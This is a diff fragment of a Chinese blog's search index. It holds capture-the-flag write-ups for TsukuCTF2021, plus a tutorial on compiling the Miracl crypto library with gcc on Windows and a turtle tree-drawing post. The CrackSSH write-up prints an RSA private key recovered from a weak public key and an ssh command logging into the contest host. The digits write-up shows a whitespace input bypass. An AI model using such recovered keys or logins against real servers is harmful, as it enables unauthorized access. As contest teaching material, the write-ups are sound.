-alXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2
-Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi
-gNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj
-pXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA
-I2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM
-OZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP
-+WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/
-KS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO
-OgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO
-cP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2
-/MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X
------END RSA PRIVATE KEY-----
-</code></pre>
-<pre><code class="shell">chmod 600 id_rsa
-ssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa
-</code></pre>
-<p><strong>flag:</strong><code>TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125;</code></p>
-<h1 id="digits"><a href="#digits" class="headerlink" title="digits"></a>digits</h1><p><em>コンピュータは高速に正しく計算してくれますが、昔のコンピュータは今ほど正確に計算できないことがありました。現在もハードウェアの故障などが原因でとても低い確率でコンピュータは計算をミスするでしょう。 運が良いあなたならこの問題が解けるはずです。10 桁の好きな数字をクエリパラメータ q に入れて、神に祈りましょう。</em><br><em><a href="https://tsukuctf.sechack365.com/problems/digits">https://tsukuctf.sechack365.com/problems/digits</a></em></p>
-<hr>
-<p>访问<code>problems/digits</code>:</p>
-<pre><code class="json">&#123;
-    &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
-&#125;
-</code></pre>
-<p>题目给了源码：</p>
-<pre><code class="python">from typing import Optional
-from fastapi import FastAPI
-import random
-
-app = FastAPI()
-FLAG = &quot;TsukuCTF&#123;&#125;&quot;
-
-@app.get(&quot;/&quot;)
-def main(q: Optional[str] = None):
-    print(q)
-    if q == None:
-        return &#123;
-            &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
-        &#125;
-    if len(q) != 10:
-        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
-    if &quot;-&quot; in q or &quot;+&quot; in q:
-        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
-    try:
-        if not type(int(q)) is int:
-            return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
-    except:
-        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
-
-    you_are_lucky = 0
-
-    for _ in range(100):
-        idx = random.randrange(4)
-        if q[idx] &lt; &quot;0&quot;:
-            you_are_lucky += 1
-        if q[idx] &gt; &quot;9&quot;:
-            you_are_lucky += 1
-
-    if you_are_lucky &gt; 0:
-        return &#123;&quot;flag&quot;: FLAG&#125;
-    else:
-        return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125;
-</code></pre>
-<p>要求找到查询参数q的值，满足:</p>
-<ul>
-<li><code>q != None</code></li>
-<li><code>len(q) == 10</code></li>
-<li>不包含<code>-</code>和<code>+</code></li>
-<li>可以使用<code>int(q)</code>进行转换</li>
-<li>至少包含一个0-9之外的字符</li>
-</ul>
-<p><code>python</code>中使用<code>int</code>进行强制类型转换时会忽略两侧的空格，提交<code>q=   4567890</code>即可</p>
-<pre><code class="json">&#123;
-    &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot;
-&#125;
-</code></pre>
-<p><strong>flag:</strong><code>TsukuCTF&#123;you_are_lucky_Tsukushi&#125; </code></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>TsukuCTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ThorCTF2021 Writeup</title>
     <url>/posts/1756116899/</url>
     <content><![CDATA[<h1 id="Shingeki-no-RSA"><a href="#Shingeki-no-RSA" class="headerlink" title="Shingeki no RSA"></a>Shingeki no RSA</h1><p><em>One encryption, three params, you know what to do.</em></p>
@@ -3507,50 +3362,148 @@ SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
   </entry>
   <entry>
-    <title>Windows下编译Miracl密码库</title>
-    <url>/posts/2543483413/</url>
-    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Miracl是一个密码学C语言函数库,网上针对Windows环境下使用的教程都是使用MSVC编译的,步骤比较繁琐,还需安装Visual Studio。看了一下官网文档,是支持使用gcc进行编译的,遂尝试了一下。</p>
-<h1 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h1><ul>
-<li><a href="http://www.codeblocks.org/downloads">CodeBlocks</a></li>
-<li><a href="https://gitforwindows.org/">Git Bash</a><span id="more"></span></li>
-</ul>
-<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><ol>
-<li>从Github上下载项目最新源码。(<a href="https://github.com/miracl/MIRACL/archive/master.zip">下载地址</a>)</li>
-<li>打开Git Bash,创建一个文件夹<code>miracl</code>，并将压缩文件拷贝至此。<br><code>mkdir miracl</code></li>
-<li>打开Git Bash，输入如下命令，将所有文件解压到一个目录中。<br><code>unzip -j -aa -L master.zip</code></li>
-<li>编辑<code>gcdoit.bat</code>，注释掉最后几行并保存。<img data-src="/posts/2543483413/pasted-1.png" class=""></li>
-<li>执行<code>gcdoit.bat</code>,生成的<code>miracl.a</code>即为编译好的库。</li>
-</ol>
-<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><ol>
-<li><p>打开CodeBlocks，新建Console application项目。</p>
-<img data-src="/posts/2543483413/pasted-2.png" class=""></li>
-<li><p>将<code>mirdef.h</code>、<code>miracl.h</code>、<code>miracl.a</code>拷贝至项目根目录。</p>
+    <title>TsukuCTF2021 Writeup</title>
+    <url>/posts/434189373/</url>
+    <content><![CDATA[<h1 id="CrackSSH"><a href="#CrackSSH" class="headerlink" title="CrackSSH!"></a>CrackSSH!</h1><p><em>調査対象のサーバーで使われている公開鍵を入手した。噂によると、この鍵には問題があるらしいが...。なんとかして侵入しなければ。</em><br><em>Target: frt.hongo.wide.ad.jp</em><br><em>Port: 30022</em></p>
+<hr>
+<p>题目中给了一个公钥:</p>
+<pre><code class="asciiarmor">ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp
+</code></pre>
+<p>参考知乎(<a href="https://zhuanlan.zhihu.com/p/33949377">ssh-keygen生成的id_rsa文件的格式</a>)上的的一篇文章:</p>
+<p>首先,<code>awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C</code>,得到:</p>
+<pre><code class="assembly">00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 81 01  |....ssh-rsa.....|
+00000010  62 80 d6 16 23 ba f8 71  8b 00 86 2a c1 be 9d b2  |b...#..q...*....|
+00000020  e3 fe 26 32 ea 94 70 92  49 1a eb 82 7a 2f e5 4b  |..&amp;2..p.I...z/.K|
+00000030  3e 9e 0a dc 95 52 44 41  33 9b 3b 40 5b 18 e4 84  |&gt;....RDA3.;@[...|
+00000040  63 a5 7a 89 77 bf 30 d1  a9 1d 89 fb 89 d2 54 e2  |c.z.w.0.......T.|
+00000050  3d 16 12 72 88 17 52 80  40 a6 5c 96 28 8c 65 52  |=..r..R.@.\.(.eR|
+00000060  53 9e 9b 08 c7 5c ca c1  24 29 85 73 e5 ed 3e c5  |S....\..$).s..&gt;.|
+00000070  00 23 64 3a e8 b6 99 be  15 3d 15 01 dc 1d 5a e6  |.#d:.....=....Z.|
+00000080  4c eb cc d9 63 c0 c4 f4  7d ae a3 d7 5a 1c 27 ff  |L...c...&#125;...Z.&#39;.|
+00000090  00 00 00 81 02 01 f9 8f  ba 8e 6f 71 bc d8 9b 9d  |..........oq....|
+000000a0  92 c8 a0 0b c8 56 fd 46  7e 56 e3 43 90 28 2a 9e  |.....V.F~V.C.(*.|
+000000b0  76 c8 fa be de 74 6b d4  dd 5a 6a 55 e1 1d 5d 69  |v....tk..ZjU..]i|
+000000c0  5d cc 1a d7 2a da f3 5f  83 14 3b 2e e1 b7 69 3c  |]...*.._..;...i&lt;|
+000000d0  2e df db 9a 4b ae 20 59  29 a4 8d 4f b2 b4 fa c4  |....K. Y)..O....|
+000000e0  50 74 fe 74 88 16 98 8e  c1 76 0b 28 3c 1e 3a 1e  |Pt.t.....v.(&lt;.:.|
+000000f0  19 a5 d5 92 1d db 3b 0d  95 d9 6c 14 b1 4e 2a 12  |......;...l..N*.|
+00000100  bf 53 8c f6 cc ce b0 82  c6 41 43 40 f9 f0 3b 09  |.S.......AC@..;.|
+00000110  a2 59 03 3c 19                                    |.Y.&lt;.|
+00000115
+</code></pre>
+<ul>
+<li><p>前4个字节(00 00 00 07)表示接下来的数据块是7个字节,接下来7个字节的内容是73 73 68 2d 72 73 61,正好是<code>ssh-rsa</code>的ASCII码</p>
 </li>
-<li><p>对着CB左侧工作空间中的项目名右键，点击添加文件,将上述三个文件添加至项目中。</p>
-<img data-src="/posts/2543483413/pasted-3.png" class=""></li>
-<li><p>CB会弹出如下错误提示,莫慌.</p>
-<img data-src="/posts/2543483413/error.png" class=""></li>
-<li><p>对着CB左侧工作空间中的项目名右键,点击生成选项,修改链接器设置.</p>
-<img data-src="/posts/2543483413/pasted-4.png" class="">
-<div class="note warning">
-            <p>环境设置选择: 仅使用项目选项</p>
-          </div></li>
-<li><p>在<code>main.c</code>中输入如下代码，进行测试。</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;miracl.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    big x,y,z;</span><br><span class="line">    miracl *mip = <span class="built_in">mirsys</span>(<span class="number">1000</span>, <span class="number">16</span>);</span><br><span class="line">    x= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    y= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    z= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,x);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,y);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,z);</span><br><span class="line">    <span class="built_in">add</span>(x,y, z);</span><br><span class="line">    <span class="built_in">cotnum</span>(z,stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>点击CB中的生成并运行按钮，如图所示。</p>
-<img data-src="/posts/2543483413/pasted-5.png" class="" title="运行结果图">
+<li><p>接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到e的16进制</p>
 </li>
-<li><p>gcc编译命令为:</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc filename.c miracl.a -o filename</span><br><span class="line">./filename.exe</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
-<li><a href="https://www.cnblogs.com/little-kwy/p/12285955.html">树莓派下编译并使用miracl密码库</a></li>
-<li><a href="https://blog.csdn.net/joker_clown/article/details/83662846">win10+gcc+miracl</a></li>
+<li><p>再接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到n的16进制</p>
+<pre><code class="shell">~$ echo &quot;$((16#00000081))&quot;
+129
+~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;)
+~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e
+0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c
+~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n
+bf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021
+</code></pre>
+</li>
 </ul>
+<blockquote>
+<p>官方的Writeup给了另一种做法,可以直接得到e和n的16进制表示形式</p>
+<pre><code class="shell">~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse
+    0:d=0  hl=4 l= 264 cons: SEQUENCE          
+    4:d=1  hl=3 l= 129 prim: INTEGER  :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19
+  136:d=1  hl=3 l= 129 prim: INTEGER  :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF
+</code></pre>
+</blockquote>
+<p>使用<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>生成私钥,保存至<code>id_rsa</code></p>
+<pre><code class="shell">python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private
+</code></pre>
+<pre><code class="asciiarmor">-----BEGIN RSA PRIVATE KEY-----
+MIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a
+alXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2
+Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi
+gNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj
+pXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA
+I2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM
+OZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP
++WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/
+KS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO
+OgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO
+cP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2
+/MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<pre><code class="shell">chmod 600 id_rsa
+ssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa
+</code></pre>
+<p><strong>flag:</strong><code>TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125;</code></p>
+<h1 id="digits"><a href="#digits" class="headerlink" title="digits"></a>digits</h1><p><em>コンピュータは高速に正しく計算してくれますが、昔のコンピュータは今ほど正確に計算できないことがありました。現在もハードウェアの故障などが原因でとても低い確率でコンピュータは計算をミスするでしょう。 運が良いあなたならこの問題が解けるはずです。10 桁の好きな数字をクエリパラメータ q に入れて、神に祈りましょう。</em><br><em><a href="https://tsukuctf.sechack365.com/problems/digits">https://tsukuctf.sechack365.com/problems/digits</a></em></p>
+<hr>
+<p>访问<code>problems/digits</code>:</p>
+<pre><code class="json">&#123;
+    &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
+&#125;
+</code></pre>
+<p>题目给了源码：</p>
+<pre><code class="python">from typing import Optional
+from fastapi import FastAPI
+import random
+
+app = FastAPI()
+FLAG = &quot;TsukuCTF&#123;&#125;&quot;
+
+@app.get(&quot;/&quot;)
+def main(q: Optional[str] = None):
+    print(q)
+    if q == None:
+        return &#123;
+            &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
+        &#125;
+    if len(q) != 10:
+        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
+    if &quot;-&quot; in q or &quot;+&quot; in q:
+        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
+    try:
+        if not type(int(q)) is int:
+            return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
+    except:
+        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
+
+    you_are_lucky = 0
+
+    for _ in range(100):
+        idx = random.randrange(4)
+        if q[idx] &lt; &quot;0&quot;:
+            you_are_lucky += 1
+        if q[idx] &gt; &quot;9&quot;:
+            you_are_lucky += 1
+
+    if you_are_lucky &gt; 0:
+        return &#123;&quot;flag&quot;: FLAG&#125;
+    else:
+        return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125;
+</code></pre>
+<p>要求找到查询参数q的值，满足:</p>
+<ul>
+<li><code>q != None</code></li>
+<li><code>len(q) == 10</code></li>
+<li>不包含<code>-</code>和<code>+</code></li>
+<li>可以使用<code>int(q)</code>进行转换</li>
+<li>至少包含一个0-9之外的字符</li>
+</ul>
+<p><code>python</code>中使用<code>int</code>进行强制类型转换时会忽略两侧的空格，提交<code>q=   4567890</code>即可</p>
+<pre><code class="json">&#123;
+    &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot;
+&#125;
+</code></pre>
+<p><strong>flag:</strong><code>TsukuCTF&#123;you_are_lucky_Tsukushi&#125; </code></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
       <tags>
-        <tag>Miracl</tag>
-        <tag>密码学</tag>
+        <tag>CTF</tag>
+        <tag>TsukuCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -3625,18 +3578,50 @@ SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;
       </tags>
   </entry>
   <entry>
-    <title>利用Python画小树和森林（宽度优先绘制+深度优先绘制)</title>
-    <url>/posts/15900/</url>
-    <content><![CDATA[<p>在中M上看嵩天老师的<a href="http://www.icourse163.org/learn/BIT-268001">《Python语言程序设计》</a>时,视频中给出了宽度优先绘制法的代码,仅提了一下还有另外一种画法(深度优先绘制法).联系到最近学的数据结构，摸索出了另一种画法。</p>
-<span id="more"></span>
-<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 2, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># drawtree.py</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> Turtle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">plist, l, a, f</span>):</span><br><span class="line">    <span class="comment">#宽度优先绘制法</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; plist is list of pens</span></span><br><span class="line"><span class="string">    l is length of branch</span></span><br><span class="line"><span class="string">    a is half of the angle between 2 branches</span></span><br><span class="line"><span class="string">    f is factor by which branch is shortened</span></span><br><span class="line"><span class="string">    from level to level.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> l &gt; <span class="number">5</span>:</span><br><span class="line">        lst = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> plist:</span><br><span class="line">            p.forward(l)<span class="comment">#Move the turtle forward by the specified distance, in the direction the turtle is headed.</span></span><br><span class="line">            q = p.clone()<span class="comment">#Create and return a clone of the turtle with same position, heading and turtle properties.</span></span><br><span class="line">            p.left(a) <span class="comment">#Turn turtle left by angle units</span></span><br><span class="line">            q.right(a)<span class="comment"># turn turtle right by angle units, nits are by default degrees, but can be set via the degrees() and radians() functions.</span></span><br><span class="line">            lst.append(p)</span><br><span class="line">            lst.append(q)</span><br><span class="line">        tree(lst, l*f, a, f)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree2</span>(<span class="params">p,l,a,f</span>):</span><br><span class="line">    <span class="comment">#深度优先绘制法</span></span><br><span class="line">    <span class="keyword">if</span> l&gt;<span class="number">5</span>:</span><br><span class="line">        p.forward(l)</span><br><span class="line">        q=p.clone()</span><br><span class="line">        p.left(a)</span><br><span class="line">        q.right(a)</span><br><span class="line">        tree2(p, l*f, a, f)</span><br><span class="line">        tree2(q, l*f, a, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maketree</span>(<span class="params">x,y</span>):     </span><br><span class="line">    p = Turtle()</span><br><span class="line">    p.color(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">    p.pensize(<span class="number">5</span>)</span><br><span class="line">    p.setundobuffer(<span class="literal">None</span>)</span><br><span class="line">    p.hideturtle() </span><br><span class="line">    <span class="comment">#Make the turtle invisible. It’s a good idea to do this while you’re in the middle of doing some complex drawing,</span></span><br><span class="line">    <span class="comment">#because hiding the turtle speeds up the drawing observably.</span></span><br><span class="line">    <span class="comment">#p.speed(9)</span></span><br><span class="line">    p.getscreen().tracer(<span class="number">1</span>,<span class="number">0</span>)<span class="comment">#Return the TurtleScreen object the turtle is drawing on.</span></span><br><span class="line">    <span class="comment">#TurtleScreen methods can then be called for that object.</span></span><br><span class="line">    p.left(<span class="number">90</span>)<span class="comment"># Turn turtle left by angle units. direction</span></span><br><span class="line"> </span><br><span class="line">    p.penup() <span class="comment">#Pull the pen up – no drawing when moving.</span></span><br><span class="line">    p.goto(x,y)<span class="comment">#Move turtle to an absolute position. If the pen is down, draw line. Do not change the turtle’s orientation.</span></span><br><span class="line">    p.pendown()<span class="comment"># Pull the pen down – drawing when moving. </span></span><br><span class="line">    <span class="comment">#这三条语句是一个组合相当于先把笔收起来再移动到指定位置，再把笔放下开始画.否则turtle一移动就会自动的把线画出来</span></span><br><span class="line"> </span><br><span class="line">    tree([p], <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>)</span><br><span class="line">    </span><br><span class="line">    p.penup() </span><br><span class="line">    p.setheading(<span class="number">90</span>)<span class="comment">#Set the orientation of the turtle to to_angle.</span></span><br><span class="line">    p.goto(x,y)</span><br><span class="line">    p.down()</span><br><span class="line">    p.color(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    tree2(p, <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    maketree(-<span class="number">200</span>, -<span class="number">200</span>)</span><br><span class="line">    maketree(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    maketree(<span class="number">200</span>,-<span class="number">200</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/20171202204712994.jpg"></p>
+    <title>Windows下编译Miracl密码库</title>
+    <url>/posts/2543483413/</url>
+    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Miracl是一个密码学C语言函数库,网上针对Windows环境下使用的教程都是使用MSVC编译的,步骤比较繁琐,还需安装Visual Studio。看了一下官网文档,是支持使用gcc进行编译的,遂尝试了一下。</p>
+<h1 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h1><ul>
+<li><a href="http://www.codeblocks.org/downloads">CodeBlocks</a></li>
+<li><a href="https://gitforwindows.org/">Git Bash</a><span id="more"></span></li>
+</ul>
+<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><ol>
+<li>从Github上下载项目最新源码。(<a href="https://github.com/miracl/MIRACL/archive/master.zip">下载地址</a>)</li>
+<li>打开Git Bash,创建一个文件夹<code>miracl</code>，并将压缩文件拷贝至此。<br><code>mkdir miracl</code></li>
+<li>打开Git Bash，输入如下命令，将所有文件解压到一个目录中。<br><code>unzip -j -aa -L master.zip</code></li>
+<li>编辑<code>gcdoit.bat</code>，注释掉最后几行并保存。<img data-src="/posts/2543483413/pasted-1.png" class=""></li>
+<li>执行<code>gcdoit.bat</code>,生成的<code>miracl.a</code>即为编译好的库。</li>
+</ol>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><ol>
+<li><p>打开CodeBlocks，新建Console application项目。</p>
+<img data-src="/posts/2543483413/pasted-2.png" class=""></li>
+<li><p>将<code>mirdef.h</code>、<code>miracl.h</code>、<code>miracl.a</code>拷贝至项目根目录。</p>
+</li>
+<li><p>对着CB左侧工作空间中的项目名右键，点击添加文件,将上述三个文件添加至项目中。</p>
+<img data-src="/posts/2543483413/pasted-3.png" class=""></li>
+<li><p>CB会弹出如下错误提示,莫慌.</p>
+<img data-src="/posts/2543483413/error.png" class=""></li>
+<li><p>对着CB左侧工作空间中的项目名右键,点击生成选项,修改链接器设置.</p>
+<img data-src="/posts/2543483413/pasted-4.png" class="">
+<div class="note warning">
+            <p>环境设置选择: 仅使用项目选项</p>
+          </div></li>
+<li><p>在<code>main.c</code>中输入如下代码，进行测试。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;miracl.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    big x,y,z;</span><br><span class="line">    miracl *mip = <span class="built_in">mirsys</span>(<span class="number">1000</span>, <span class="number">16</span>);</span><br><span class="line">    x= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    y= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    z= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,x);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,y);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,z);</span><br><span class="line">    <span class="built_in">add</span>(x,y, z);</span><br><span class="line">    <span class="built_in">cotnum</span>(z,stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>点击CB中的生成并运行按钮，如图所示。</p>
+<img data-src="/posts/2543483413/pasted-5.png" class="" title="运行结果图">
+</li>
+<li><p>gcc编译命令为:</p>
